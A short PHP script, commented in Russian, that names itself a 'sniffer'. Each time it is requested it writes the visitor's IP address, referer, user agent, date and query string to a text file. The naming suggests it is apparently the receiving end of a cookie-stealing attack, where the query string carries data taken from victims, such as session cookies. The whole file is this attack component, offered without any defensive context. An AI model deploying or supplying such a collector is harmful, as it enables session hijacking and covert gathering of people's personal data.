<?
$snif[] = date("d.m.Y H:i"); // дата
$snif[] = $_SERVER['REMOTE_ADDR']; // айпишник юзверя
@$snif[] = $_SERVER['HTTP_REFERER']; // рефер
@$snif[] = $_SERVER['QUERY_STRING']; // переданные параметру снифферу
$snif[] = $_SERVER['HTTP_USER_AGENT'];  // агент юзверя =)
$file = "file.txt"; // файл в который будут записаны данные
$s = fopen($file,"a+");
@$sa = fread ($s,filesize($file));
$fp = fopen($file,"w");
foreach ($snif as $sniffed)
{
fwrite($fp,"\n".$sniffed);
}
fwrite($fp,"\n");
fwrite($s,$sa);
fclose($s);
fclose($fp);
?>